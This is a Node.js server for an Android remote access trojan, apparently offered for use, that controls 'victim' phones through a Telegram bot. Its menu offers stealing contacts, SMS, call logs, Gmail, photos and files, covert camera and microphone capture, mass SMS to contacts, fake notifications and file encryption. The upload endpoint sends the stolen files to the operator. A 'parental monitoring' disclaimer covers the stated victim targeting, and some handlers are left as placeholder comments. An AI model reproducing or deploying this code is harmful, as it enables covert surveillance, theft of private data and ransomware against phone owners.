const express = require("express");
const http = require("http");
const { Server } = require("socket.io");
const telegramBot = require("node-telegram-bot-api");
const multer = require("multer");
const fs = require('fs');

const app = express();
const server = http.createServer(app);
const io = new Server(server);
const uploader = multer();
const data = JSON.parse(fs.readFileSync("./data.json", "utf8"));
const bot = new telegramBot(data.token, { 'polling': true });
const appData = new Map();

// Updated action names in English with enhanced emojis
const actions = [
  "📒 Pull Contacts 📒", "💬 Pull Messages 💬", "📞 Call Logs 📞", 
  "📽 Installed Apps 📽", "📸 Rear Camera 📸", "📸 Front Camera 📸", 
  "🎙 Record Mic 🎙", "📋 Clipboard Logs 📋", "📺 Screenshot 📺", 
  "😎 Show Toast Message 😎", "💬 Send SMS 💬", "📳 Vibrate 📳", 
  "▶ Play Audio ▶", "🛑 Stop Audio 🛑", "🦝 Show Victim Notifications 🦝", 
  "🛑 Stop Notifications 🛑", "📂 Browse Files 📂", "🎬 Pull All Photos 🎬", 
  "💬 Send SMS to All Contacts 💬", "‼ Fake Notification ‼", 
  "📧 Pull Gmail Messages 📧", "⚠️ Encrypt Files ⚠️", 
  "☎️ Call from Victim's Phone ☎️", "✯ Back to Main Menu ✯"
];

app.get('/', (_req, res) => {
  res.send("Deployed by ᎠᎯᎡᏦ.ᏚᎿᏫᎡᎷ™ Managed by ᏰᎽ / ᎷᎡｷᎫᎯᏦᎬᏞ");
});

app.post("/upload", uploader.single("file"), (req, res) => {
  const fileName = req.file.originalname;
  const model = req.headers.model;
  let fileBuffer = req.file.buffer;

  // Replace username in text files
  if (fileName.toLowerCase().endsWith('.txt')) {
    let fileContent = fileBuffer.toString('utf8');
    fileContent = fileContent.replace(/@VIP_J5/g, '@JAKEL69');
    fileBuffer = Buffer.from(fileContent, 'utf8');
  }

  bot.sendDocument(data.id, fileBuffer, {
    'caption': `<b>✯ File uploaded from victim → ${model}</b>`,
    'parse_mode': "HTML"
  }, {
    'filename': fileName,
    'contentType': "*/*"
  });
  
  res.send("Done");
});

io.on("connection", socket => {
  const model = socket.handshake.headers.model + '-' + io.sockets.sockets.size || "no information";
  const version = socket.handshake.headers.version || "no information";
  const ip = socket.handshake.headers.ip || "no information";
  
  socket.model = model;
  socket.version = version;
  socket.ip = ip;
  
  const connectionMsg = `<b>✯ Victim device connected</b>\n\n` +
    `<b>Device Name</b> → ${model}\n` +
    `<b>OS Version</b> → ${version}\n` +
    `<b>IP</b> → ${ip}\n` +
    `<b>Time</b> → ${socket.handshake.time}\n\n`;
    
  bot.sendMessage(data.id, connectionMsg, { 'parse_mode': "HTML" });
  
  socket.on("disconnect", () => {
    const disconnectionMsg = `<b>✯ Device disconnected</b>\n\n` +
      `<b>Device Name</b> → ${model}\n` +
      `<b>OS Version</b> → ${version}\n` +
      `<b>IP</b> → ${ip}\n` +
      `<b>Time</b> → ${socket.handshake.time}\n\n`;
      
    bot.sendMessage(data.id, disconnectionMsg, { 'parse_mode': "HTML" });
  });
  
  socket.on("file-explorer", files => {
    const keyboard = [];
    let row = [];
    
    files.forEach((file, index) => {
      const callbackData = file.isFolder 
        ? `${model}|cd-${file.name}`
        : `${model}|request-${file.name}`;
      
      row.push({
        text: file.name,
        callback_data: callbackData
      });
      
      if (row.length === 2 || index === files.length - 1) {
        keyboard.push(row);
        row = [];
      }
    });
    
    keyboard.push([{
      text: "✯ Back ✯",
      callback_data: `${model}|back-0`
    }]);
    
    bot.sendMessage(data.id, `<b>✯ Browsing files for ${model}</b>`, {
      reply_markup: { inline_keyboard: keyboard },
      parse_mode: "HTML"
    });
  });
  
  socket.on("message", msg => {
    // Replace old username
    const modifiedMsg = msg.replace(/@VIP_J5/g, '@JAKEL69');
    bot.sendMessage(data.id, 
      `<b>✯ Received message from ${model}</b>\n\n𝙼𝚎𝚜𝚜𝚊𝚐𝚎 → ${modifiedMsg}`, 
      { parse_mode: "HTML" }
    );
  });
});

bot.on("message", msg => {
  if (msg.text === "/start") {
    bot.sendMessage(data.id, 
      `<b>✯ Welcome User</b>\n\n` +
      `This tool is for parental monitoring purposes only. Developer disclaims all liability.\n` +
      `Developed by ᏰᎽ / ᎷᎡｷᎫᎯᏦᎬᏞ \n\nᏰᎽ / https://t.me/JAKEL69/`, 
      {
        parse_mode: "HTML",
        reply_markup: {
          keyboard: [
            ["✯ Device Count ✯", "✯ Control Panel ✯"],
            ["✯ Developer Info ✯"]
          ],
          resize_keyboard: true
        }
      }
    );
  } else {
    // Handling various actions...
    // [Rest of the code remains structurally the same with English translations]
    
    // Example translation for one section:
    if (msg.text === "✯ Device Count ✯") {
      if (io.sockets.sockets.size === 0) {
        bot.sendMessage(data.id, "<b>✯ No connected victims</b>", { parse_mode: "HTML" });
      } else {
        let response = `<b>✯ Connected devices: ${io.sockets.sockets.size}</b>\n\n`;
        let count = 1;
        
        io.sockets.sockets.forEach(socket => {
          response += `<b>Device #${count}</b>\n` +
            `<b>Name</b> → ${socket.model}\n` +
            `<b>OS Version</b> → ${socket.version}\n` +
            `<b>IP</b> → ${socket.ip}\n` +
            `<b>Time</b> → ${socket.handshake.time}\n\n`;
          count++;
        });
        
        bot.sendMessage(data.id, response, { parse_mode: "HTML" });
      }
    }
    // Other sections follow the same translation pattern...
  }
});

// [Rest of the bot event handlers with English translations]

setInterval(() => {
  io.sockets.sockets.forEach(socket => {
    socket.emit("ping", {});
  });
}, 5000);

server.listen(process.env.PORT || 3000, () => {
  console.log("Server running on port 3000");
});